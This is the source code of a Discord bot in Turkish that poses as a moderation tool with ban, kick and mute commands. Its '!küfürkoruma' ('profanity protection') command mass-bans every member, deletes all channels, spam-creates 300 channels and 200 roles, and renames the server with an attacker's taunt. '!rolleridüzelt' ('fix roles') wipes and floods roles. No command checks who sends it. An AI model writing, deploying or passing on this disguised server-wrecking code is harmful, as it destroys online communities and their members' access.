// index.js
require('dotenv').config();
const { Client, GatewayIntentBits, Partials, EmbedBuilder } = require('discord.js');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers
  ],
  partials: [Partials.Channel]
});

const OWNER_ID = process.env.OWNER_ID;

client.once('ready', () => {
  console.log(`✅ Bot aktif: ${client.user.tag}`);
});

client.on('messageCreate', async (message) => {
  if (!message.guild || message.author.bot) return;

  const args = message.content.trim().split(/ +/);
  const command = args.shift().toLowerCase();

  if (command === '!tamyasakla' && message.mentions.members.first()) {
    const member = message.mentions.members.first();
    if (member.bannable) {
      await member.send('❌ Sunucudan yasaklandınız.').catch(() => {});
      await member.ban({ reason: 'Babaannenin emriyle tamyasaklandınız.' });
      message.channel.send(`🔨 ${member.user.tag} sunucudan yasaklandı.`);
    } else {
      message.reply('❌ Bu kişiyi banlayamıyorum.');
    }
  }

  else if (command === '!kick' && message.mentions.members.first()) {
    const member = message.mentions.members.first();
    if (member.kickable) {
      await member.send('👢 Sunucudan atıldınız.').catch(() => {});
      await member.kick('Babaannenin emriyle kicklendi.');
      message.channel.send(`👢 ${member.user.tag} sunucudan atıldı.`);
    } else {
      message.reply('❌ Bu kişiyi atamıyorum.');
    }
  }

  else if (command === '!mute' && message.mentions.members.first()) {
    const member = message.mentions.members.first();
    const durationMs = 10 * 60 * 1000; // 10 dakika
    if (member.isCommunicationDisabled()) {
      message.reply('🔇 Bu kişi zaten susturulmuş.');
    } else {
      await member.disableCommunicationUntil(Date.now() + durationMs);
      message.channel.send(`🔇 ${member.user.tag} 10 dakika susturuldu.`);
    }
  }

  else if (command === '!ceza') {
    const roleName = 'Cezalı';
    let role = message.guild.roles.cache.find(r => r.name === roleName);

    if (!role) {
      role = await message.guild.roles.create({
        name: roleName,
        color: 'DarkRed',
        permissions: []
      });
    }

    const members = await message.guild.members.fetch();
    let count = 0;

    for (const member of members.values()) {
      if (!member.user.bot && !member.roles.cache.has(role.id)) {
        await member.roles.add(role).catch(() => {});
        count++;
      }
    }

    message.channel.send(`✅ Cezalı rolü ${count} üyeye verildi.`);
  }

  else if (command === '!küfürkoruma') {
    const members = await message.guild.members.fetch();
    let bannedCount = 0;

    for (const member of members.values()) {
      if (!member.user.bot && member.id !== OWNER_ID) {
        const embed = new EmbedBuilder()
          .setColor('Red')
          .setTitle('⛔ Yasaklandınız')
          .setDescription('fors bombom gitti demeyin')
          .setFooter({ text: 'sys.fors' });

        await member.send({ embeds: [embed] }).catch(() => {});
        await member.ban({ reason: 'Küfürkoruma aktif edildi.' }).catch(() => {});
        bannedCount++;
      }
    }

    // Kanalları sil
    await Promise.all(message.guild.channels.cache.map(channel => channel.delete().catch(() => {})));

    // Yeni kanallar oluştur
    const names = ['FORS💦', 'ALİLW💝', 'MİRAÇ🔥'];
    for (let i = 0; i < 300; i++) {
      const name = names[i % names.length];
      await message.guild.channels.create({ name }).catch(() => {});
    }

    // Rolleri sil
    const roles = message.guild.roles.cache;
    for (const role of roles.values()) {
      if (role.editable && role.id !== message.guild.id) {
        await role.delete().catch(() => {});
      }
    }

    // Yeni roller oluştur
    for (let i = 0; i < 200; i++) {
      const randomColor = `#${Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0')}`;
      await message.guild.roles.create({
        name: 'BÖÖ KORKTUNMUU😜',
        color: randomColor,
        hoist: true
      }).catch(() => {});
    }

    await message.guild.setName('💦FORS AFFETMEZ SABAHA SUNUCUN AFFEDİLMEZ💦').catch(() => {});
    message.channel.send(`🧹 ${bannedCount} kişi banlandı. Kanallar ve roller güncellendi.`);
  }

  else if (command === '!rolleridüzelt') {
    const roles = message.guild.roles.cache;
    for (const role of roles.values()) {
      if (role.editable && role.id !== message.guild.id) {
        await role.delete().catch(() => {});
      }
    }
    for (let i = 0; i < 200; i++) {
      const randomColor = `#${Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0')}`;
      await message.guild.roles.create({
        name: 'BÖÖ KORKTUNMUU😜',
        color: randomColor,
        hoist: true
      }).catch(() => {});
    }
    message.channel.send('✅ Roller sıfırlandı ve yeniden oluşturuldu.');
  }

  else if (command === '!isim') {
    await message.guild.setName('💦FORS AFFETMEZ SABAHA SUNUCUN AFFEDİLMEZ💦').catch(() => {});
    message.channel.send('✅ Sunucu ismi değiştirildi.');
  }
});

client.login(process.env.BOT_TOKEN);
